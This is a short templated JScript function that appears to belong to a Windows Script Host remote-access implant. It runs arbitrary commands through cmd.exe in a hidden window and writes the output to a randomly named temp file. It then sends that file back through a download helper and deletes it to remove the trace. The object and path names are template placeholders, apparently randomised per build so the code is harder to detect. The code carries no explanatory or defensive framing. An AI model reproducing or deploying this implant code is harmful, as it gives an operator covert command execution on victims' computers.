function comspec(command) {
  stdout_path = {{ variables['tmp'][1] }} + '\\{{ random_string }}.txt';
  if ({{ variables['file-system-object'][0] }}.FileExists(stdout_path)) {
    return stdout_path + ' already exists, please remove before running commands.';
  }
  command = {{ variables['compsec'][1] }} + ' /q /c ' + command + ' 1> ' + stdout_path + ' 2>&1';
  try {
    {{ variables['wscript.shell'][0] }}.Run(command, 0, true);
    results = 'Executed ( ' + command + ' )\n\n';
    results = results + download(stdout_path, 'string');
    delfile(stdout_path);
    return results;
  } catch (e) {
    return 'Failed to run ' + command + ': ' + e.message;
  }
}
